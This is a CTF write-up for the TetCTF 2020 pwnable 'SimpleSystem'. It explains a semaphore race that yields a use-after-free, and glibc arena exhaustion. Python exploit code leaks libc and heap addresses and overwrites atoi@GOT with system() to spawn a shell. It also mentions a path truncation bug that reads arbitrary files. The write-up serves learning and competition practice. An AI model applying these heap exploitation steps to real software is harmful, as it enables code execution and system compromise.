# TetCTF 2020 - SimpleSystem
## Introduction
- **Given files:** `SimpleSystem`, `libc-2.23.so`.
- **Category:** Pwnable
- **Hint**: `do you know an arena can be reused when arena list is full ?`
- **Summary:** A glibc 2.23 heap challenges that is very unique. It is a simple system (as the name suggest) that we can signup, signin and use its functionalities, it utilizes multithreading to implement them. The bug is in the synchronization implementation of multithreading, and the exploitation relies on how glibc handles `malloc()` on multithreaded environment (although there is another intended bug in the authentication process, but it is not needed).

## TL;DR
1. Analyze the executable -> Found that after signing in, if we go into sleep mode, then signout & delete, then signin again, we can signin to a deleted session due to a failed implementation of synchronization `semaphore`.
2. Create a lot of users, signin to 1 of them and use the above bug -> leak `libc` when `show_info`.
3. Signin to 8 others and put them to a long `sleep mode` -> Use maximum number of `heap arenas`.
4. Use the above bug on the 1st user again -> the `bk` pointer of an unsorted bin actually set the `is_admin` flag to `true`.
5. Create 7 notes to fill up the other `arenas` -> 8th note will be in `main arena` -> Overlap on `session` itself.
6. Overwrite `session->fullname` to leak `heap`.
7. Edit note to overwrite `session->head`, edit again to overwrite `atoi@GOT` into `system()`.
8. Input `sh` into choice prompt -> Get shell.
   
## Analyzing the binary
On startup, the program gives us 2 options:
- `Signup` to create an account. We will be asked for a `fullname`, a `username` and a `password`. If they are valid, the `username` will be used to create a directory underneath `creds` to store 2 files `u.dat` and `p.dat`, with `u.dat` storing the full name and `p.dat` storing the `MD5` hash of the `password`.
- `Signin` to signin to an account. The program will ask for the `username` and the `password` to check if they exist. If they do, it will lookup a `session list` to see if that user is currently having a session or not, if not, it will create a session for it. It also checks if the `username` is `admin` or not to set the `is_admin` flag. The `session` struct is as follows:
```c
struct str_session
{
    char padd[8];
    __int64 is_admin;
    __int64 sess_id;
    pthread_mutex_t mutex_lock;
    char* fullname;
    char username[0x30];
    __int64 note_id;
    str_note* head;
    str_note* tail;
}
```

*Note: Actually, as the author `@d4rkn3ss` reveals, there is a path truncation bug in the authentication process that can let you login to anything and read any file. With this you can leak every addresses through `/proc/self/maps`, leak `admin`'s hashed password to crack it, and leak the number of CPUs through `/proc/cpuinfo`. But I still managed to solve this without using this bug.*

After logging in, we have 6 options to choose from, each of these actions will be run on a separate thread, synchronized by a `mutex_lock` within each `session` and a global `semaphore`:
1. `Add` a note. This can only be performed as an `admin`, the note size can be up to `0xFFFF` and notes are stored as a linked list.
2. `Edit` a note. This also can only be performed as `admin`.
3. `Show` user info. This shows the user's fullname and notes.
4. `Sleep` mode. This puts the current thread to `sleep()` for the inputted amount of time (in seconds).
5. `Signout & delete`: signout of the current `session` and delete it, freeing everything its own.
6. `Signout`: signout of the current `session`, but still keep it in the `session list`.

This is the struct of a `note`:
```c
struct str_note
{
    str_note* next;
    __int64 size;
    char* content;
}
```

The bug here is that even though in `signout & delete` the program tries to acquire the `mutex_lock`, it doesn't call `sem_wait()` on the `semaphore` on the way out and goes straight into `sem_destroy()`. This way, if we go into `sleep mode`, the `mutex_lock` will be acquired and `sem_post()` will increment `semaphore` before `sleep()`, after that when we choose to `signout & delete`, this thread must wait for the sleeping thread to unlock its `mutex_lock` before it can execute, but the thing is on the main thread after `signout & delete`, it doesn't need to wait for the `semaphore` of the sleeping thread to be incremented before proceeding, therefore it will signout to the main menu on the *main thread*, while the *deleting thread* is still waiting for the `mutex_lock`. In short, we have 3 threads here:
- the *sleeping thread* holding the `mutex_lock`, incrementing the `semaphore`.
- the *deleting thread* waiting for `mutex_lock` to be released to proceed.
- the *main thread*, which should be waiting for the `semaphore`, is instead ignoring it and signout to main menu.

Using this bug, we can: `signin -> sleep -> signout & delete -> signin` to sign back into a deleted session. Notice that the `is_admin` flag in the `session` struct is located at the 2nd `QWORD`, it will be overwrited by the `bk` pointer of an unsorted bin, therefore we have a "fake" `admin` in this deleted session. Also the `fullname` chunk is freed, so we can `show` info to leak the `libc` address from it.
```python
# Leak libc with synchronization bug -> UAF
signin(user[0], user[0])
sleep_thread(1)
signout_delete()
signin(user[0], user[0])
show()
r.recvuntil("Your name: ")
l.address = u64(r.recv(6) + b'\0'*2) - 0x3c4b78
log.info("libc: {}".format(hex(l.address)))
```

## Exploit the multithreaded heap
The exploitation path is quite clear then: if we can `add` a note exactly the same size as a `session` struct, then it will be allocated add the freed `session` we are currently in and we can overwrite everything in it. But here is the big problem: Each thread will `malloc()` into its own `heap arena`, so initially, it seems like there are no way to `malloc()` into the `main arena` from another thread. 

That's when the **hint** comes in handy. By googling about this multithreading heap management stuff, I came into [this doc about MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals). It says that the maximum number of heap arenas is `8 * #processors`. After all the arenas have been allocated, threads will try to reuse one of the other arenas. This is so nice because we can use `sleep mode` to create a lot of hanging threads, then try to `malloc()` into the `main arena` in the next (the author is nice enough to even make a call to `malloc()` in `sleep mode`). That's exactly what I did, even though the intended way is to read `/proc/cpuinfo` to know the number of processors, I just assumed that it's 1 and try it out (if it's not I could always bruteforce it, can't be too big anyway). Therefore I created 8 sleeping threads:
```python
# Fill all 8 created arenas with 8 notes
for i in range(1, 9):
    #print(i)
    signin(user[i], user[i])
    sleep_thread(i + 100)
    signout()
```

Now the next `malloc()` should be into the `main arena`, but not really. The way allocation works after filling the arenas is weird. I haven't read any resource about it yet, but as I experimented it, it seems like the program cycles through each of the arena on each thread to make new allocations. I'm not really sure about this, but what I did was doing trials-and-errors and I found that if I create 7 dummy notes, the 8th one will by in `main arena`, also set the note size to `0x90` to be the same as a `session` struct.
```python
# Fill all 8 created arenas with 8 notes
r.sendline("1")
r.sendlineafter("Size: \n", str(0x90))
r.sendafter("Content: \n", "0"*8) # note 0
for i in range(1, 8):
    add_note(0x90, chr(i)*8) # note 1 -> 7

# Next note will be in main arena, overwrite freed session -> overwrite full name to leak heap
payload1 = p64(0) + p64(1)
payload1 += p64(0) # sess_id
payload1 += p64(2) + p64(0x100000eee) + p64(0)*3 # mutex lock
payload1 += p64(0x603190) # full name -> leak
add_note(0x90, payload1) # note 8
show()
r.recvuntil("Your name: ")
heap = u64(r.recv(4) + b'\0'*4) - 0x19f0
log.info("heap: {}".format(hex(heap)))
```

I used this note to overwrite `fullname` to a pointer to the `session list` (the binary has `No PIE`) to leak `heap` address. I also had to make sure that the other overwritten fields of `session` are acceptable by the process, especially the `mutex_lock` one.

## Overwrite GOT and get shell
Now I can use `edit` to overwrite `str_session->head` to the start of `session` struct, where I created a fake `note` whose `str_note->content` points to `atoi@GOT`. Then editting this note again to overwrite `atoi@GOT` to `system`. For the next prompt the make a choice to the options, I could just pass `sh` to it, then `atoi("sh")` will be called, which actually is `system("sh")` now.
```python
# Edit to point to atoi@GOTS
payload2 = p64(0) + p64(0x90)
payload2 += p64(b.got["atoi"]) # sess_id
payload2 += p64(2) + p64(0x100000eee) + p64(0)*3 # mutex lock
payload2 += p64(0) # full name
payload2 += p64(0)*6 # username
payload2 += p64(1) # note_id
payload2 += p64(heap + 0xe90) # head
payload2 += p64(heap + 0xe90) # tail
edit_note(0, payload2)

# Edit again to overwrite atoi@GOTS
edit_note(0, p64(l.symbols["system"]))

# Get shell
r.sendlineafter("choice: \n", "sh")
```

The flag is:
```
TetCTF{vina: *100*50421406550161#}
```

## Appendix
The full exploit is `a.py`.